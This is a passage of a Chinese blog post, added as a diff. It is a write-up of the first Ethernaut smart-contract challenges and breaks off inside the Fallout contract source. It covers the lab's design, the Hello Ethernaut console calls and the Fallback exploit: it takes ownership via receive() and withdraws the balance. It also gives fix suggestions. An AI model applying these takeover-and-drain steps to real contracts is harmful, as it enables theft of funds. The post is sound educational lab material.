@@ -1,0 +1,853 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功","en":"复制成功","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败","en":"复制失败","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    OpenZeppelin 的智能合约攻防挑战题解 |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="OpenZeppelin 的智能合约攻防挑战题解该靶场运行原理在 Ethernaut（OpenZeppelin 的智能合约攻防挑战平台）中，玩家通过生成新实例、操作并提交实例来完成挑战。这种模式的原理涉及 智能合约工厂模式、状态验证与链上交互，以下是详细解析：  1. 生成新实例（Create Instance） 工厂合约部署  每个挑战都有一个工厂合约（如 Level01.sol），玩家调用其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenZeppelin 的智能合约攻防挑战题解">
+<meta property="og:url" content="http://example.com/2025/08/12/openzeppelin-de-zhi-neng-he-yue-gong-fang-tiao-zhan-ti-jie/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="OpenZeppelin 的智能合约攻防挑战题解该靶场运行原理在 Ethernaut（OpenZeppelin 的智能合约攻防挑战平台）中，玩家通过生成新实例、操作并提交实例来完成挑战。这种模式的原理涉及 智能合约工厂模式、状态验证与链上交互，以下是详细解析：  1. 生成新实例（Create Instance） 工厂合约部署  每个挑战都有一个工厂合约（如 Level01.sol），玩家调用其">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-08-12T11:03:12.232Z">
+<meta property="article:modified_time" content="2025-08-12T14:22:32.448Z">
+<meta property="article:author" content="mX1@0">
+<meta name="twitter:card" content="summary">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" integrity="sha384-4NN3fZ5AokFyHuoihl7A9qWaCt+HsAtOaUsXwJGRb4&#x2F;SMBtFr2vcNSHR5E8dg0Wk" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">加载中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" alt="OpenZeppelin 的智能合约攻防挑战题解">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">OpenZeppelin 的智能合约攻防挑战题解</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="sidebar-left"  >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenZeppelin-%E7%9A%84%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E9%98%B2%E6%8C%91%E6%88%98%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">OpenZeppelin 的智能合约攻防挑战题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A5%E9%9D%B6%E5%9C%BA%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">该靶场运行原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E6%96%B0%E5%AE%9E%E4%BE%8B%EF%BC%88Create-Instance%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 生成新实例（Create Instance）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B%EF%BC%88Exploit%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 操作实例（Exploit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8F%90%E4%BA%A4%E9%AA%8C%E8%AF%81%EF%BC%88Submit-Instance%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 提交验证（Submit Instance）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Hello-Ethernaut"><span class="toc-number">1.2.</span> <span class="toc-text">1 Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Fallback"><span class="toc-number">1.3.</span> <span class="toc-text">2 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Fallout"><span class="toc-number">1.4.</span> <span class="toc-text">3 Fallout</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-OpenZeppelin 的智能合约攻防挑战题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-12T11:03:12.232Z" itemprop="datePublished">2025-08-12</time>
+    <time style="display: none;" id="post-update-time">2025-08-12</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="OpenZeppelin-的智能合约攻防挑战题解"><a href="#OpenZeppelin-的智能合约攻防挑战题解" class="headerlink" title="OpenZeppelin 的智能合约攻防挑战题解"></a>OpenZeppelin 的智能合约攻防挑战题解</h1><h2 id="该靶场运行原理"><a href="#该靶场运行原理" class="headerlink" title="该靶场运行原理"></a>该靶场运行原理</h2><p>在 <strong>Ethernaut</strong>（OpenZeppelin 的智能合约攻防挑战平台）中，玩家通过生成新实例、操作并提交实例来完成挑战。这种模式的原理涉及 <strong>智能合约工厂模式、状态验证与链上交互</strong>，以下是详细解析：</p>
+<hr>
+<h3 id="1-生成新实例（Create-Instance）"><a href="#1-生成新实例（Create-Instance）" class="headerlink" title="1. 生成新实例（Create Instance）"></a>1. <strong>生成新实例（Create Instance）</strong></h3><ul>
+<li><strong>工厂合约部署</strong><br>  每个挑战都有一个<strong>工厂合约</strong>（如 <code>Level01.sol</code>），玩家调用其 <code>createInstance()</code> 函数时：<ul>
+<li>工厂会动态部署一个<strong>独立的挑战实例合约</strong>（如 <code>Instance01.sol</code>）。</li>
+<li>实例合约的地址会返回给玩家，并记录在工厂的状态中（如 <code>playerToInstance[msg.sender]</code>）。</li>
+</ul>
+</li>
+<li><strong>关键点</strong><ul>
+<li>每个玩家获得的实例是<strong>专属的</strong>，避免多人操作冲突。</li>
+<li>实例合约的初始状态包含预设的漏洞或挑战目标（如 <code>bool public isComplete = false</code>）。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="2-操作实例（Exploit）"><a href="#2-操作实例（Exploit）" class="headerlink" title="2. 操作实例（Exploit）"></a>2. <strong>操作实例（Exploit）</strong></h3><ul>
+<li><strong>玩家与实例交互</strong><br>  玩家需要分析实例合约的代码，找到漏洞或逻辑缺陷，并通过以下方式操作：<ul>
+<li>调用实例的函数（如 <code>hackMe()</code>）。</li>
+<li>修改关键状态变量（如将 <code>isComplete</code> 改为 <code>true</code>）。</li>
+<li>可能涉及：重入攻击、权限绕过、存储覆盖等以太坊常见漏洞。</li>
+</ul>
+</li>
+<li><strong>链上执行</strong><br>  所有操作通过交易（Transaction）在区块链上执行，确保<strong>可验证性</strong>和<strong>不可篡改性</strong>。</li>
+</ul>
+<hr>
+<h3 id="3-提交验证（Submit-Instance）"><a href="#3-提交验证（Submit-Instance）" class="headerlink" title="3. 提交验证（Submit Instance）"></a>3. <strong>提交验证（Submit Instance）</strong></h3><ul>
+<li><strong>工厂合约验证</strong><br>  玩家调用工厂的 <code>validateInstance(address instance)</code> 函数时：<ol>
+<li>工厂检查 <code>instance</code> 是否为该玩家生成的合约。</li>
+<li>调用实例合约的<strong>预定义验证方法</strong>（如 <code>isComplete()</code>）。</li>
+<li>若验证通过（如返回 <code>true</code>），则标记挑战完成，并可能奖励玩家（如 NFT 徽章）。</li>
+</ol>
+</li>
+<li><strong>防作弊设计</strong><ul>
+<li>验证逻辑通常放在工厂合约中，而非实例合约，防止玩家直接篡改。</li>
+<li>实例合约的状态必须通过<strong>链上交易</strong>修改，确保公平性。</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-Hello-Ethernaut"><a href="#1-Hello-Ethernaut" class="headerlink" title="1 Hello Ethernaut"></a>1 Hello Ethernaut</h2><p>这道题，主要考察的是控制台执行函数调用，通过语句<code>contract.函数名</code>来进行函数的调用，从而查看函数的返回值，然后进入下一个内容，层层递进，最终完成合约交互，提交最终的实例。</p>
+<p><strong>生成的实例是真实部署到测试网的合约</strong></p>
+<p>执行流程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract.info()</span><br><span class="line">contract.info1()</span><br><span class="line">contract.info2("hello")</span><br><span class="line">contract.infoNum()</span><br><span class="line">contract.info42()</span><br><span class="line">contract.theMethodName()</span><br><span class="line">contract.method7123949()</span><br><span class="line">contract.password()</span><br><span class="line">contract.authenticate("ethern0")</span><br></pre></td></tr></tbody></table></figure>
+
+<p>合约源码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance {</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = "The method name is method7123949.";</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) {</span><br><span class="line">        password = _password;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) {</span><br><span class="line">        return "You will find what you need in info1().";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) {</span><br><span class="line">        return 'Try info2(), but with "hello" as a parameter.';</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) {</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked("hello"))) {</span><br><span class="line">            return "The property infoNum holds the number of the next info method to call.";</span><br><span class="line">        }</span><br><span class="line">        return "Wrong parameter.";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) {</span><br><span class="line">        return "theMethodName is the name of the next method.";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) {</span><br><span class="line">        return "If you know the password, submit it to authenticate().";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public {</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {</span><br><span class="line">            cleared = true;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) {</span><br><span class="line">        return cleared;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="2-Fallback"><a href="#2-Fallback" class="headerlink" title="2 Fallback"></a>2 Fallback</h2><blockquote>
+<p>仔细看下面的合约代码.</p>
+<p>通过这关你需要</p>
+<ol>
+<li>获得这个合约的所有权</li>
+<li>把他的余额减到0</li>
+</ol>
+<p> 这可能有帮助</p>
+<ul>
+<li>如何通过与ABI互动发送ether</li>
+<li>如何在ABI之外发送ether</li>
+<li>转换 wei/ether 单位 (参见 <code>help()</code> 命令)</li>
+<li>Fallback 方法</li>
+</ul>
+</blockquote>
+<p>合约源码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback {</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() {			//构造函数，初始化操作</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() {		//函数修饰符，函数执行前先执行修饰符内的内容</span><br><span class="line">        require(msg.sender == owner, "caller is not the owner");	//验证调用者是否为主人</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function contribute() public payable {</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) {//如果贡献值大于主人，那么就成为主人</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) {	//查询贡献值</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner {		//提出所有余额</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>漏洞点</strong>：</p>
+<ul>
+<li><code>receive()</code> 函数在接收 ETH 时，若调用者有贡献记录（<code>contributions[msg.sender] &gt; 0</code>），会将其设为 <code>owner</code>。</li>
+</ul>
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li>调用 <code>contribute()</code> 存入少量 ETH</li>
+</ol>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>({<span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'0.0001'</span>)});</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong>作用</strong>：满足 <code>contributions[msg.sender] &gt; 0</code> 的条件。</li>
+<li><strong>关键限制</strong>：必须发送 <code>&lt; 0.001 ETH</code>（因 <code>contribute()</code> 中有数值检查）。</li>
+</ul>
+<ol start="2">
+<li>直接发送 ETH 触发 <code>receive()</code></li>
+</ol>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>({<span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'0.0001'</span>)});</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong>原理</strong>：<ul>
+<li>直接向合约地址转账（无 calldata）会触发 <code>receive()</code>。</li>
+<li>由于攻击者已通过 <code>contribute()</code> 存入过 ETH，满足 <code>contributions[msg.sender] &gt; 0</code>，此时 <code>owner</code> 被修改为攻击者地址。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>调用 <code>withdraw()</code> 提取所有 ETH</li>
+</ol>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong>前提</strong>：攻击者已成为 <code>owner</code>（通过 <code>receive()</code> 篡改成功）。</li>
+<li><strong>结果</strong>：合约余额被全部转移到攻击者地址。</li>
+</ul>
+<p><strong>修复建议</strong></p>
+<ol>
+<li><p><strong>分离 ETH 接收和权限管理</strong>：</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable {</span><br><span class="line">    contributions[msg.sender] += msg.value; // 仅更新贡献值</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>使用明确的权限转移函数</strong>：</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function transferOwnership(address newOwner) public onlyOwner {</span><br><span class="line">    owner = newOwner;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>添加事件日志</strong>：</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event OwnershipTransferred(address oldOwner, address newOwner);</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+<h2 id="3-Fallout"><a href="#3-Fallout" class="headerlink" title="3 Fallout"></a>3 Fallout</h2><blockquote>
+<p>获得以下合约的所有权来完成这一关.</p>
+<p> 这可能有帮助</p>
+<ul>
+<li>Solidity Remix IDE</li>
+</ul>
+</blockquote>
+<p>合约源码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import "openzeppelin-contracts-06/math/SafeMath.sol";</span><br><span class="line"></span><br><span class="line">contract Fallout {</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    //constructor</span><br><span class="line">    function Fal1out() public payable {</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() {</span><br><span class="line">        require(msg.sender == owner, "caller is not the owner");</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function allocate() public payable {</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public {</span><br><span class="line">        